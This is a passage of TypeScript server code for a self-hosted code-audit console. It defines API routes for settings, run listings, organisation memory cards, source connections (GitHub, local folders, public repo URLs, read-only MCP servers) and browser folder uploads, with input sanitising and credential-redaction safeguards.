  else for (const e of readdirSync(root, { withFileTypes: true })) {
    if (e.isDirectory() && isRepo(join(root, e.name))) repos.push({ path: realpathSync(join(root, e.name)), name: e.name });
  }
  if (!repos.length) throw new Error(`No git repos in ${root} (looked at the folder and its immediate subfolders).`);
  return { id: 'src_' + randomBytes(3).toString('hex'), kind: 'local', name: 'Local folders', status: 'ready', detail: `${root} · ${repos.length} repo(s) · read-only`, localRepos: repos };
}
// Browser folder UPLOAD → a 'local' source. Unlike connectLocal (path-based, needs a server-side path), this works on
// any install: the browser reads a picked folder's text files and posts them as {path, content}; we write a
// read-only snapshot under <DATA_DIR>/uploads/<tenant>/<folder> and register it as a localRepo the run-time
// snapshot-copy (copyRepoSnapshot) reads exactly like a path-connected folder. For projects with no GitHub.
const UPLOADS_DIR = join(process.env.THERESA_DATA_DIR || join(process.cwd(), '.data'), 'uploads');
// One path-segment sanitizer shared by the upload writer AND the remove endpoint's containment check —
// they MUST agree on how a tenant maps to its uploads subdir, or the delete guard checks the wrong dir.
const safeSeg = (s: string) => String(s || '').replace(/[^A-Za-z0-9._-]+/g, '-').replace(/^-+|-+$/g, '').slice(0, 60);
function saveUploadedFolder(tenant: string, rawName: string, files: { path: string; content: string }[]): { path: string; name: string; count: number } {
  const name = safeSeg(rawName) || 'folder';
  const base = join(UPLOADS_DIR, safeSeg(tenant) || 'org', name + '-' + randomBytes(3).toString('hex'));
  mkdirSync(base, { recursive: true });
  // The browser's webkitRelativePath is prefixed with the picked folder's name (the client sends that as `name`);
  // writeUploadedFiles strips it so the files land at the snapshot ROOT (was `<base>/<name>/…` → `name/name/…` in
  // the workspace). Traversal / NUL / containment guards live there too (src/sources/uploadedFolder.ts).
  const count = writeUploadedFiles(base, files, String(rawName || ''));
  if (!count) { rmSync(base, { recursive: true, force: true }); throw new Error('No usable files in that folder (everything was skipped or empty).'); }
  return { path: base, name, count };
}
function sourceArtifacts(s: Source): { id: string; label: string; sub: string }[] {
  // A repo the last run's pre-flight could not reach with the clone credential is flagged (cloneable:false), so
  // the picker can say so instead of offering it as a normal target again.
  if (s.kind === 'github') return (s.repos ?? []).map((r) => ({ id: r.fullName, label: r.fullName, sub: (r.private ? 'private' : 'public') + (r.cloneable === false ? ' · not reachable by the clone credential' : ''), ...(r.cloneable === false ? { cloneable: false as const, cloneError: r.cloneError } : {}) }));
  if (s.kind === 'local') return (s.localRepos ?? []).map((r) => ({ id: r.path, label: r.name, sub: 'local folder', ...(r.uploadedAt ? { uploadedAt: r.uploadedAt } : {}), ...(r.count != null ? { count: r.count } : {}) }));   // The picker renders upload time + file count
  if (s.kind === 'giturl') return (s.giturlRepos ?? []).map((r) => ({ id: r.fullName, label: r.fullName, sub: 'public URL' }));
  // Warehouse is an agentic ENRICH source (mounted as an MCP tool into the agents),
  // not a standalone run target — so it is not listed as a selectable artifact (the
  // run API only scopes by repos/projects). Don't advertise it as runnable.
  return [];
}
function publicSource(s: Source) {
  const base = { id: s.id, kind: s.kind, name: s.name, status: s.status, detail: s.detail, artifacts: sourceArtifacts(s) };
  // Boxes are exposed for the connected-list UI. `key` is a PATH (not the key material) and box-connect
  // is LOCAL-MACHINE ONLY, so echoing the path back to the user's own console is fine — it lets a
  // loaded profile present its full config (incl. the .pem path).
  // Generic read-only MCP planes (analytics/bi/custom): surface the NON-SECRET coords so the Data MCPs textarea can
  // prefill for round-trip editing / reconnect (fillMcpList reads mcpUrl) and the card can show the server name. The
  // bearer token is NEVER returned (write-only); mcpTokenRef is a secret NAME (a ref, not the value).
  if (s.kind === 'analytics' || s.kind === 'bi' || s.kind === 'custom') return {
    ...base, mcpUrl: s.mcpUrl === undefined ? undefined : redactUrlCredentials(s.mcpUrl).safe, mcpName: s.mcpName, exposes: s.exposes, allowedTools: s.allowedTools,
  };
  return base;
}

// ── router ────────────────────────────────────────────────────────────────────────
const server = createServer(async (req, res) => {
  try {
    const url = new URL(req.url || '/', BASE_URL);
    const path = url.pathname;
    const method = req.method || 'GET';

    const refused = requestGuard(req, method);
    if (refused) return sendJson(res, 403, { error: refused });

    if (method === 'GET' && !path.startsWith('/api/')) {
      res.setHeader('Cache-Control', 'no-store');
      return sendHtml(res, 200, renderApp({ version: APP_VERSION, runMode: RUN_MODE, localAudit: LOCAL_AUDIT, codeintelAvailable: codeintelEnabled(), docRecoveryAvailable: docRecoveryEnabled(), invariants: (() => { const floor = new Set(baselineFloorInvariants().map((i) => i.key)); return [...INVARIANTS, ...RANKING_INVARIANTS].map((i) => ({ key: i.key, title: i.title, ranking: RANKING_INVARIANTS.some((r) => r.key === i.key), floor: floor.has(i.key), owner: i.owner || 'baseline', mount: i.mount || 'floor' })); })() }));
    }

    // Single-user, self-hosted: every request acts as the one local user (no login). The server binds to localhost by
    // default (HOST); exposing it beyond this machine is the user's explicit choice (see README → Security).
    const session: Session | null = LOCAL_SESSION;
    const ws = sessionWs(session);
    const wsOrg = actingOrgId(session);

    // ── Settings: API keys · spending cap · telemetry ──────────────────────────────────────────────────────────
    if (method === 'GET' && path === '/api/settings') {
      return sendJson(res, 200, {
        version: APP_VERSION,
        keys: apiKeyStatus(),
        runBudget: runBudget(), effectiveRunBudget: effectiveRunBudget(),
        connections: { remember: rememberCredentials() },
        telemetry: { ...telemetryStatus(), notice: telemetryNotice(), fields: TELEMETRY_FIELDS, example: examplePayload() },
      });
    }
    if (method === 'POST' && path === '/api/settings/keys') {
      const body = await readBody(req);
      try {
        const keys = setApiKeys({
          anthropic: typeof body.anthropic === 'string' ? body.anthropic : undefined,
          openai: typeof body.openai === 'string' ? body.openai : undefined,
          save: typeof body.save === 'boolean' ? body.save : undefined,
        });
        return sendJson(res, 200, { keys });
      } catch (e) {
        if (e instanceof ApiKeyError) return sendJson(res, 400, { error: e.message });
        throw e;
      }
    }
    if (method === 'POST' && path === '/api/settings/budget') {
      const body = await readBody(req);
      try { return sendJson(res, 200, { runBudget: saveRunBudget(body.usd), effectiveRunBudget: effectiveRunBudget() }); }
      catch (e) { if (e instanceof SettingsError) return sendJson(res, 400, { error: e.message }); throw e; }
    }
    if (method === 'POST' && path === '/api/settings/connections') {
      const body = await readBody(req);
      if (typeof body.remember !== 'boolean') return sendJson(res, 400, { error: 'remember must be a boolean' });
      setRememberCredentials(body.remember);
      persist();   // write (or drop) the credentials file for the current connections right away
      return sendJson(res, 200, { connections: { remember: rememberCredentials() } });
    }
    if (method === 'POST' && path === '/api/settings/telemetry') {
      const body = await readBody(req);
      if (typeof body.enabled === 'boolean') setTelemetryEnabled(body.enabled);
      if (body.noticeShown === true) markNoticeShown();
      return sendJson(res, 200, { telemetry: telemetryStatus() });
    }

    if (method === 'GET' && path === '/api/state') {
      // Multi-org: the console shows only the acting org's runs. A run belongs to the acting org when its
      // captured org (run.orgId, or the tenant map for pre-seam runs) equals the session's acting org. For a
      // single-org deployment every run resolves to the same org → the filter keeps all runs = no behavior change.
      const stateActingOrg = actingOrgId(session!);
      return sendJson(res, 200, {
        actingOrgId: stateActingOrg,
        // The per-run spend cap the console shows beside live spend ("cap $X (instance)"). effectiveRunBudget is what
        // the ledger actually enforces — 0 = unbounded (force-all without an explicit THERESA_RUN_BUDGET).
        runBudget: runBudget(),
        effectiveRunBudget: effectiveRunBudget(),
        // Boot probe of the instance's OPENAI_API_KEY — false = rejected (banner), undefined = no key / inconclusive.
        openaiAuthOk,
        sources: ws!.sources.map(publicSource),
        runs: store.listRunsByTenant(session!.tenant).filter((r) => (r.orgId ?? orgIdForTenant(r.tenant)) === stateActingOrg).map((r) => ({
          id: r.id,
          mode: r.mode,
          kind: r.kind, // 'org' | 'audit' | 'ask' — drives the console's per-kind run-detail view (ask runs skip the pipeline/event graph)
          question: r.askQuestion, // ask runs: the raw intake question, shown in the minimal ask detail (undefined for org/audit)
          answer: r.askAnswer, // ask runs: the grounded answer — shown in the minimal ask run-detail
          scope: r.kind === 'ask' ? r.askScope : r.scopeLabel, // ask runs: the scope label (chat bubble context); org runs: the user's Scope label (the run hero's subtitle)
          targetName: r.targetName,
          repoFilter: r.repoFilter,
          giturlFilter: r.giturlFilter ?? null,   // The console opens an evidence permalink only into THIS run's own repos (repoFilter + giturlFilter)
          scopeRepos: [...(r.askRepos ?? []), ...(r.auditRepos ?? []), ...(r.codeManifest?.repos ?? [])].map((x) => x.fullName),   // report scope: a Quick Ask's / Rec audit's repos, for the same link check
          projectFilter: r.projectFilter,
          status: r.status,
          reportWords: r.status === 'complete' ? runReportWords(r) : undefined,   // '~N min' read time in the Start-here guide (mtime-memoized)
          findings: r.findings,
          costUsd: r.costUsd,   // Updated INCREMENTALLY while running (live spend, runLedgerHooks), the exact total once terminal
          ruledOut: r.ruledOut,   // Ruled-out rows, NOT counted in `findings` (the confirmed count)
          degraded: r.degraded,   // [{stage, reason, at}] — fail-open stages that degraded (run-page warning banner)
          brief: r.brief,
          error: r.error,
          logCount: r.log.length,
          createdAt: r.createdAt,
          createdBy: r.createdBy,
          alias: r.alias,   // optional human label; UI shows it instead of the rs_… id (id stays the unique key)
          renamed: r.renamed,   // user-edited title; the console prefers this over the generated title (runTitle)
          // whether this run produced the second (leadership) report — drives the console's
          // "Open leadership report" affordance. Prefer the in-memory flag (this-process runs); only stat
          // disk for a RESTORED, COMPLETE run (skips the existsSync for running/error/this-process runs).
          leadership: Boolean(r.leadershipHtml) || (r.status === 'complete' && reportExists(r.id + '-leadership')),
          // per-bundle area reports (id+title); HTML fetched via /api/runs/:id/bundle/:bundleId. Mirror the
          // leadership guard: trust the in-memory set for this-process runs; for a RESTORED run (leadershipHtml
          // nulled on restore) stat disk so a missing file never surfaces an Open button that 404s.
          bundleReports: (r.bundleReports ?? []).filter((b) => Boolean(r.leadershipHtml) || reportExists(r.id + '-bundle-' + b.id)),
          // the Report Normalizer's merged single-file tabbed deliverable → drives the "Combined report" affordance. Same guard.
          combined: Boolean(r.combinedHtml) || (r.status === 'complete' && reportExists(r.id + '-combined')),
          // merged agent trajectory + tool tally → drives the "Run trace" affordance. Same guard pattern.
          hasTrace: Boolean(r.hasTrace) || (r.status === 'complete' && reportExists(r.id + '-trace')),
          hasAudit: Boolean(r.hasAudit) || (r.status === 'complete' && reportExists(r.id + '-audit')),
          // dedicated eng-facing work-item report (ask runs that asked for fixes) → drives the "Work items" tab. Same guard.
          workItems: Boolean(r.hasWorkItems) || (r.status === 'complete' && reportExists(r.id + '-workitems')),
          // standalone provenance / doc-recovery report (design & evolution from git history) → drives the "Design & Evolution" tab. Same guard.
          provenance: Boolean(r.hasProvenance) || (r.status === 'complete' && reportExists(r.id + '-provenance')),
          // per-run codeintel flag → drives the run-detail "Code intelligence" viz card. The flag is set at run
          // creation (and by the backfill tool) but was never serialized, so the card could never render.
          codeintel: r.codeintel === true,
          // Do the FINAL reports actually carry the codeintel maps? Recorded by executeOrgRun once the reports are
          // final; undefined on legacy/in-flight runs (the card then says "not recorded"), false ⇒ card says unavailable.
          codeintelInReports: typeof r.codeintelInReports === 'boolean' ? r.codeintelInReports : undefined,
          // Report tab: every FINISHED run with a viewable report (drives the all-reports grid); trashed ones go to Trash.
          hasReport: r.status === 'complete' && (Boolean(r.reportHtml) || reportExists(r.id)),
          learned: r.learned ?? null,   // memory layer: reusable method + ledger merge counts (value-free)
          recognized: r.recognized ?? null,   // QuickAsk memory: recognized reusable method (value-free, no ledger write)
          writeMemory: r.writeMemory === true,   // ask runs: "Write learnings to memory" tick was set → drives the post-run Memory surface on the ask detail
          trashed: Boolean(r.trashed), trashedAt: r.trashedAt,
          // checkpoint/resume surfaces: meta rows (payloads stay on disk), lineage + supersession chips,
          // and the parent spend the replayed cuts represent (display-only cost note).
          checkpoints: (r.checkpoints ?? []).map(({ id, label, detail, at, bundlesDone, spentUsd }) => ({ id, label, detail, at, bundlesDone, spentUsd })),
          resumedFrom: r.resumedFrom, supersededBy: r.supersededBy, reusedCostUsd: r.reusedCostUsd,
          // incremental re-scan: the baseline this run planned against + what it reused and why (non-secret)
          baselineRunId: r.baselineRunId, incremental: r.incremental, fullRescan: r.fullRescan === true, siblingRecall: r.siblingRecall === true,
        })).reverse(),
      });
    }

    // Org memory — READ-ONLY browse for the Memory tab (Phase 0). Resolves the session tenant → org_id,
    // then returns tier-1 (this org's private cards) live from the backend card store; tier-2/tier-3 are
    // placeholders (0) until the shared/engine tiers land. FAIL-OPEN: any error → an empty, well-formed shape
    // so the tab renders rather than 500s (recall itself never blocks a run — the browse view shouldn't either).
    if (method === 'GET' && path === '/api/memory') {
      const orgId = actingOrgId(session!);
      const canWrite = memoryWritesEnabled();
      if (!orgId) return sendJson(res, 200, { org: null, version: 0, total: 0, cards: [], tier2: { count: 0 }, tier3: { count: 0, cards: [] }, canWrite });
      try {
        const { version, total, cards } = await orgMemorySummary(orgId, session!.who);
        // Tier-3 = the cross-company GLOBAL engine namespace (org_global), recalled for every org by the backend.
        // Fail-open: listOrgMemory swallows a non-200 (incl. the 403 for non-platform_admins) → [] → Tier-3
        // renders empty for them (platform admins see the global library). Tier-2 (cross-org promoted methods)
        // has no dedicated store yet → stays 0.
        const tier3Cards: MemoryCard[] = await listOrgMemory(GLOBAL_MEMORY_ORG_ID, session!.who);
        return sendJson(res, 200, { org: orgId, version, total, cards, tier2: { count: 0 }, tier3: { count: tier3Cards.length, cards: tier3Cards }, canWrite });
      } catch {
        return sendJson(res, 200, { org: orgId, version: 0, total: 0, cards: [], tier2: { count: 0 }, tier3: { count: 0, cards: [] }, canWrite });
      }
    }
    // Cross-project org memory (src/orgMemoryApi.ts): the org PROJECT
    // registry. Org-scoped by the SESSION's acting org (orgKeyFor — the same key lineage / org findings use); nothing in
    // the query or body can name another org. Writes follow the console memory-write master (THERESA_MEMORY_WRITE_ENABLED).
    if (path === '/api/org/projects' && (method === 'GET' || method === 'POST')) {
      const xpOrg = orgKeyFor(actingOrgId(session!), session!.tenant);
      if (!xpOrg) return sendJson(res, 400, { error: 'no org scope for this session' });
      const canSee = canSeeFromSources(ws!.sources);
      const r = method === 'GET' ? getOrgProjects(xpOrg, memoryWritesEnabled(), canSee) : postOrgProjects(xpOrg, await readBody(req), await orgMemoryWriteGate(session!, canSee));
      return sendJson(res, r.status, r.body);
    }
    // Fact cards + the Memory tab's deterministic Compare view (visibility-filtered: a fact whose repo this session's
    // connected credential cannot see comes back value-free) + the alias table (user confirm / remove; gated writes).
    if (method === 'GET' && (path === '/api/org/facts' || path === '/api/org/facts/compare')) {
      const xpOrg = orgKeyFor(actingOrgId(session!), session!.tenant);
      if (!xpOrg) return sendJson(res, 400, { error: 'no org scope for this session' });
      const kind = url.searchParams.get('kind');
      const canSee = canSeeFromSources(ws!.sources);
      const r = path === '/api/org/facts'
        ? getOrgFacts(xpOrg, { kind, project: url.searchParams.get('project') }, listProjects(xpOrg), canSee)
        : getOrgCompare(xpOrg, { kind }, listProjects(xpOrg), canSee, memoryWritesEnabled());
      return sendJson(res, r.status, r.body);
    }
    if (method === 'POST' && path === '/api/org/aliases') {
      const aliasOrg = orgKeyFor(actingOrgId(session!), session!.tenant);
      if (!aliasOrg) return sendJson(res, 400, { error: 'no org scope for this session' });
      const r = postOrgAliases(aliasOrg, await readBody(req), await orgMemoryWriteGate(session!, canSeeFromSources(ws!.sources)));
      return sendJson(res, r.status, r.body);
    }
    // Reverse-chron timeline of memory changes (when / what / which entrypoint) for the Memory tab's History
    // sub-tab. Session-gated (org resolved from the session tenant server-side). FAIL-OPEN: any error → { events: [] }.
    if (method === 'GET' && path === '/api/memory/history') {
      const orgId = actingOrgId(session!);
      if (!orgId) return sendJson(res, 200, { events: [] });
      // Optional ?run_id= scopes to one run's own writes — the post-run "Memory" surface on an ask detail.
      const histRunId = (url.searchParams.get('run_id') || '').trim();
      const events = await getOrgMemoryHistory(orgId, { limit: 150, runId: histRunId || undefined, actor: session!.who });
      return sendJson(res, 200, { events });
    }
    // One FULL card (body + edges + key_entities + provenance) for the Memory-tab expand view. Session-gated
    // (org resolved from the session tenant server-side — the shared secret never reaches the SPA). FAIL-OPEN:
    // any miss/error → {card:null} so the tab degrades gracefully rather than 500s.
    if (method === 'GET' && path === '/api/memory/card') {
      const id = url.searchParams.get('id') || '';
      // Tier-3 (global) cards live in org_global; the Memory tab passes org=org_global to expand them. ONLY the
      // global-namespace override is honored (it's the public cross-company library) — any other value falls back
      // to the acting org, so this can't be used to read an arbitrary org's private card.
      const orgId = (url.searchParams.get('org') === GLOBAL_MEMORY_ORG_ID) ? GLOBAL_MEMORY_ORG_ID : actingOrgId(session!);
      if (!orgId || !id) return sendJson(res, 200, { card: null });
      const card = await getOrgMemoryCard(orgId, id, session!.who);
      return sendJson(res, 200, { card: card ?? null });
    }
    // Upsert a card — HIGH-RISK: bumps the org memory version + changes what every agent recalls. The console
    // gates this behind a confirm dialog; a platform-admin gate + request-queue are a later phase (not now).
    if (method === 'POST' && path === '/api/memory/save') {
      if (!memoryWritesEnabled()) return sendJson(res, 403, { error: 'memory writes are disabled on this deployment' });
      const body = await readBody(req);
      const orgId = actingOrgId(session!);
      if (!orgId) return sendJson(res, 400, { error: 'no org_id mapping for this tenant — set THERESA_ORG_ID_MAP / THERESA_DEFAULT_ORG_ID' });
      const id = String(body?.id || '').trim();
      const type = String(body?.type || '').trim();
      const short_desc = String(body?.short_desc || '').trim();
      if (!id || !type || !short_desc) return sendJson(res, 400, { error: 'id, type and short_desc are required' });
      const result = await saveOrgMemoryCard(orgId, body as MemoryCard, session!.who);
      return sendJson(res, 200, result);
    }
    if (method === 'POST' && path === '/api/memory/delete') {
      if (!memoryWritesEnabled()) return sendJson(res, 403, { error: 'memory writes are disabled on this deployment' });
      const body = await readBody(req);
      const orgId = actingOrgId(session!);
      if (!orgId) return sendJson(res, 400, { error: 'no org_id mapping for this tenant' });
      const id = String(body?.id || '').trim();
      if (!id) return sendJson(res, 400, { error: 'id is required' });
      const result = await deleteOrgMemoryCard(orgId, id, session!.who);
      return sendJson(res, 200, result);
    }
    // Revert a History event — restore the pre-change card state it captured (append/edit/supersede/insert). Same
    // memoryWritesEnabled gate as save/delete (it mutates org memory + bumps the version). Session-gated; org
    // resolved server-side. FAIL-SAFE: revertMemoryEvent never throws — an { error } comes back for the console.
    if (method === 'POST' && path === '/api/memory/revert') {
      if (!memoryWritesEnabled()) return sendJson(res, 403, { error: 'memory writes are disabled on this deployment' });
      const body = await readBody(req);
      const orgId = actingOrgId(session!);
      if (!orgId) return sendJson(res, 400, { error: 'no org_id mapping for this tenant' });
      const eventId = String(body?.event_id || '').trim();
      if (!eventId) return sendJson(res, 400, { error: 'event_id is required' });
      return sendJson(res, 200, await revertMemoryEvent(orgId, eventId, session!.who));
    }
    // Freeform "draft to memory" (entrypoint iii) — the Add sub-tab's plain-words box. The user types a message;
    // it's intaked ONCE (not an interactive bot) → the backend LLM-extracts + dedups + APPLIES directly
    // (insert / append-merge / supersede; no review queue). Session-gated; org resolved server-side; gated on the
    // console write master (THERESA_MEMORY_WRITE_ENABLED) like save/delete/revert, since it mutates org memory.
    if (method === 'POST' && path === '/api/memory/draft') {
      if (!memoryWritesEnabled()) return sendJson(res, 403, { error: 'memory writes are disabled on this deployment' });
      const body = await readBody(req);
      const text = String(body?.text || '').trim();
      if (!text) return sendJson(res, 400, { error: 'text is required' });
      if (text.length > 4000) return sendJson(res, 400, { error: 'text is too long (max 4000 characters)' });
      const orgId = actingOrgId(session!);
      if (!orgId) return sendJson(res, 400, { error: 'no org_id mapping for this tenant — set THERESA_ORG_ID_MAP / THERESA_DEFAULT_ORG_ID' });
      const result = await draftFreeformMemory(orgId, text, session!.who);
      return sendJson(res, 200, result);
    }
    // Standalone "extract memory from a report" (Report-tab per-card action). Look up the run tenant-scoped,
    // gather ITS report text via the same resolveExportArtifact accessor the dashboard-export path uses (a full
    // scan may carry leadership + internal + per-area reports — concatenate them; an ask carries one), strip HTML
    // to plain text, and intake it ONCE through the org-memory spine. FAIL-OPEN: extractMemoryFromReport never
    // throws — an { error } comes back in the IntakeResult and the console surfaces it inline.
    if (method === 'POST' && path === '/api/memory/extract-from-report') {
      if (!memoryWritesEnabled()) return sendJson(res, 403, { error: 'memory writes are disabled on this deployment' });
      const body = await readBody(req);
      const runId = String(body?.run_id || '').trim();
      if (!runId) return sendJson(res, 400, { error: 'run_id is required' });
      const run = runInActingOrg(session!, runId);   // acting-org-scoped — can't extract memory from another org's run
      if (!run) return sendJson(res, 404, { error: 'run not found' });
      const orgId = actingOrgId(session!);
      if (!orgId) return sendJson(res, 400, { error: 'no org_id mapping for this tenant — set THERESA_ORG_ID_MAP / THERESA_DEFAULT_ORG_ID' });
      // Collect every report artifact this run has on disk / in memory (leadership → internal → each area),
      // tag-stripped + concatenated + capped, via the shared gatherRunReportText helper.
      const text = gatherRunReportText(run);
      if (!text) return sendJson(res, 400, { error: 'this run has no report content to extract from' });
      const scope = run.askScope || run.targetName || 'report';
      const result = await extractMemoryFromReport(orgId, { runId, scope, text, actor: session!.who });
      return sendJson(res, 200, result);
    }
    if (method === 'POST' && path === '/api/sources/disconnect') {
      const body = await readBody(req);
      const id = String(body.id || '');
      const before = ws!.sources.length;
      ws!.sources = ws!.sources.filter((s) => s.id !== id); // drop the source + its in-memory credential (token never re-used)
      persist();
      return sendJson(res, 200, { removed: before - ws!.sources.length });
    }

    // Folder BROWSER for the local-folder picker (local-machine only). Lists subdirectories of a
    // path (names only, no file contents) + marks which are git repos, so the UI can navigate to pick.
    if (method === 'GET' && path === '/api/local/browse') {
      if (!LOCAL_AUDIT) return sendJson(res, 400, { error: 'Local-folder audit is disabled on this instance.' });
      const raw = (url.searchParams.get('path') || process.env.HOME || '/').replace(/^~(?=\/|$)/, process.env.HOME ?? '~');
      try {
        const real = realpathSync(raw);
        if (!statSync(real).isDirectory()) return sendJson(res, 400, { error: 'Not a directory.' });
        const dirs = readdirSync(real, { withFileTypes: true })
          .filter((e) => e.isDirectory() && !e.name.startsWith('.'))
          .map((e) => ({ name: e.name, isRepo: existsSync(join(real, e.name, '.git')) }))
          .sort((a, b) => Number(b.isRepo) - Number(a.isRepo) || a.name.localeCompare(b.name));
        const parent = dirname(real);
        return sendJson(res, 200, { path: real, parent: parent !== real ? parent : null, isRepo: existsSync(join(real, '.git')), dirs });
      } catch (e) { return sendJson(res, 400, { error: e instanceof Error ? e.message : String(e) }); }
    }

    if (method === 'POST' && path === '/api/sources') {
      const body = await readBody(req);
      try {
        let src: Source;
        if (body.kind === 'mcp-set') {
          // ONE place to manage ALL generic read-only MCPs (Amplitude / Metabase / dashboards / custom): the posted list
          // REPLACES the whole set, so editing the single textarea is the source of truth. Each entry {name?,mcpUrl,mcpToken?};
          // a line with no URL is skipped (not a hard error), and entries de-dup by the derived mcpName (last wins).
          const built: Source[] = [];
          for (const e of (Array.isArray(body.mcps) ? body.mcps : [])) { try { built.push(connectMcp(e)); } catch { /* skip an entry with no URL */ } }
          // Carry over a same-name source's CREDENTIAL + POLICY when the posted entry has none — the textarea is only
          // name+URL+token, so connectMcp rebuilds with defaults and without this a routine "add one MCP" edit would,
          // for every OTHER already-connected plane: wipe its auth (→ silent 0-call), drop a
          // profile-loaded mcpTokenRef (→ lose its auto-connect), drop a profile allowlist/exposes, and flip a
          // reconnect-needed coords-only plane to a token-less 'ready' that mounts + 401s. A posted token still
          // overrides the credential (rotate).
          const prior = new Map(
            ws!.sources.filter((s) => s.kind === 'analytics' || s.kind === 'bi' || s.kind === 'custom')
              .map((s) => [s.mcpName!, s] as const),
          );
          for (const s of built) {
            const p = prior.get(s.mcpName!);
            // Only inherit a prior same-name source's credential/policy when the URL is UNCHANGED. If the user
            // kept the name but changed the URL, it's a NEW endpoint: carrying the old token would send it to a
            // different (possibly attacker-chosen) URL — a token disclosure.
            // A genuinely new MCP (no prior) likewise keeps connectMcp defaults.
            if (!p) continue;
            // The console only ever shows a credential-bearing URL in its redacted form, so re-saving the list posts that
            // form back: map it to the full URL held in memory (same endpoint — the user did not change it).
            const pSafe = redactUrlCredentials(p.mcpUrl);
            if (pSafe.hadSecret && s.mcpUrl === pSafe.safe) { s.mcpUrl = p.mcpUrl; s.detail = p.detail; }
            if (p.mcpUrl !== s.mcpUrl) continue;
            if (!s.mcpToken && p.mcpToken) s.mcpToken = p.mcpToken;
            if (s.allowedTools === undefined && p.allowedTools !== undefined) s.allowedTools = p.allowedTools;  // keep the host-side allowlist
            if (!s.exposes && p.exposes) s.exposes = p.exposes;                       // keep the plane-hint
            // a plane that WAS reconnect-needed and still has no credential stays 'error' — don't silently flip it
            // to a token-less 'ready' that the run would mount + 401 (a fresh token-less connect has no prior → 'ready').
            if (!s.mcpToken && p.status === 'error') { s.status = 'error'; s.detail = p.detail; }
          }
          // De-dup by derived mcpName (last wins); collect which names collided so the caller can surface a drop instead
          // of a mysteriously-lower count.
          const byName = new Map<string, Source>();
          const dropped = new Set<string>();
          for (const s of built) { if (byName.has(s.mcpName!)) dropped.add(s.mcpName!); byName.set(s.mcpName!, s); }
          ws!.sources = ws!.sources.filter((s) => s.kind !== 'analytics' && s.kind !== 'bi' && s.kind !== 'custom').concat([...byName.values()]);
          persist();
          return sendJson(res, 200, { sources: [...byName.values()].map(publicSource), count: byName.size, submitted: built.length, dropped: [...dropped] });
        }
        if (body.kind === 'local') {
          // ACCUMULATE: connecting another folder merges its repos into the one local source (dedup by
          // path), so you can add several folders/roots and pick repos across all of them in the Run tab.
          const fresh = connectLocal(String(body.path || ''));
          const existing = ws!.sources.find((s) => s.kind === 'local');
          if (existing) {
            const list = existing.localRepos ?? (existing.localRepos = []);
            const seen = new Set(list.map((r) => r.path));
            let added = 0;
            for (const r of fresh.localRepos ?? []) if (!seen.has(r.path)) { list.push(r); seen.add(r.path); added++; }
            existing.detail = `${list.length} repo(s) across your added folders · read-only`;
            persist(); return sendJson(res, 200, { source: publicSource(existing), added });
          }
          src = fresh;
        }
        else if (body.kind === 'giturl') {
          // Paste PUBLIC github.com repo URL(s) — no auth. parseRepoRef is BOTH the parser and the SSRF
          // guard: only github.com/owner/repo (or owner/repo shorthand) yields a cloneUrl; anything else
          // (arbitrary git host, ssh://, file://, garbage) returns null and is rejected. Clones are TOKENLESS
          // at run time, so this needs no credential and works on any install.
          const lines = String((body as { urls?: unknown }).urls || '').split(/[\s,]+/).map((l) => l.trim()).filter(Boolean);
          const parsed: { fullName: string; cloneUrl: string }[] = [];
          const rejected: string[] = [];
          for (const line of lines) { const r = parseRepoRef(line); if (r) parsed.push(r); else rejected.push(line.slice(0, 80)); }
          const existing = ws!.sources.find((s) => s.kind === 'giturl');
          const list = existing?.giturlRepos ?? [];
          const seen = new Set(list.map((r) => r.fullName));
          let added = 0, capped = false;
          for (const r of parsed) {
            if (seen.has(r.fullName)) continue;
            if (list.length >= GITURL_CAP) { capped = true; break; }
            list.push(r); seen.add(r.fullName); added++;
          }
          if (existing) {
            existing.giturlRepos = list;
            existing.detail = `${list.length} public repo(s) · URL, no auth`;
            persist();
            return sendJson(res, 200, { source: publicSource(existing), added, rejected, capped });
          }
          // Don't create a "ready, 0 repos" source out of an all-invalid paste — that reads as
          // success when nothing was actually connectable. Accumulating onto an EXISTING source (the `if
          // (existing)` branch above) still returns 200 + the rejected list: the connection isn't broken,
          // just this paste added nothing new.
          if (list.length === 0) return sendJson(res, 400, { error: rejected.length ? `No valid public github.com URLs found (rejected: ${rejected.slice(0, 3).join(', ')}) — only github.com/owner/repo links (or owner/repo) are accepted.` : 'Paste at least one public github.com repo URL.' });
          const gsrc: Source = { id: 'src_' + randomBytes(3).toString('hex'), kind: 'giturl', name: 'Public GitHub URL', status: 'ready', detail: `${list.length} public repo(s) · URL, no auth`, giturlRepos: list };
          addSource(ws!, gsrc); persist();
          return sendJson(res, 200, { source: publicSource(gsrc), added, rejected, capped });
        }
        else if (body.kind === 'github') src = await connectGithub(body);
        else if (body.kind === 'warehouse') src = connectWarehouse(body);
        else if (body.kind === 'keyvalue') src = connectKeyValue(body);
        else if (body.kind === 'analytics' || body.kind === 'bi' || body.kind === 'custom') src = connectMcp(body);
        else return sendJson(res, 400, { error: 'Unknown source kind.' });
        addSource(ws!, src); return sendJson(res, 200, { source: publicSource(src) });
      } catch (e) { return sendJson(res, 400, { error: e instanceof Error ? e.message : String(e) }); }
    }

    // Upload a local code FOLDER from the browser → a 'local' source (no GitHub and no server-side path
    // needed). ACCUMULATES like the path-based local connect: each uploaded folder is one localRepo.
    if (method === 'POST' && path === '/api/connect/local/upload') {
      const body = await readBody(req, 30_000_000);   // folders far exceed the default 4MB JSON cap
      const files = Array.isArray(body.files) ? body.files : [];
      if (!files.length) return sendJson(res, 400, { error: 'No files received — pick a folder, then upload. (If it was all skipped, the folder had only deps/binaries.)' });
      if (files.length > 8000) return sendJson(res, 400, { error: `Too many files (${files.length}). Remove build output / vendored deps and try again.` });
      try {
        const saved = saveUploadedFolder(session!.tenant, String(body.name || 'folder'), files);
        const existing = ws!.sources.find((s) => s.kind === 'local');
        if (existing) {
          const list = existing.localRepos ?? (existing.localRepos = []);
          list.push({ path: saved.path, name: saved.name, uploadedAt: new Date().toISOString(), count: saved.count });
          existing.detail = `${list.length} folder(s) · read-only`;
          persist(); return sendJson(res, 200, { source: publicSource(existing), added: 1, files: saved.count });
        }
        const src: Source = { id: 'src_' + randomBytes(3).toString('hex'), kind: 'local', name: 'Local code', status: 'ready', detail: `${saved.name} · ${saved.count} file(s) · read-only`, localRepos: [{ path: saved.path, name: saved.name, uploadedAt: new Date().toISOString(), count: saved.count }] };
        addSource(ws!, src);
        return sendJson(res, 200, { source: publicSource(src), added: 1, files: saved.count });
      } catch (e) { return sendJson(res, 400, { error: e instanceof Error ? e.message : String(e) }); }
    }

    // Remove one connected local folder (unconnect). Removing the last one drops the local source.
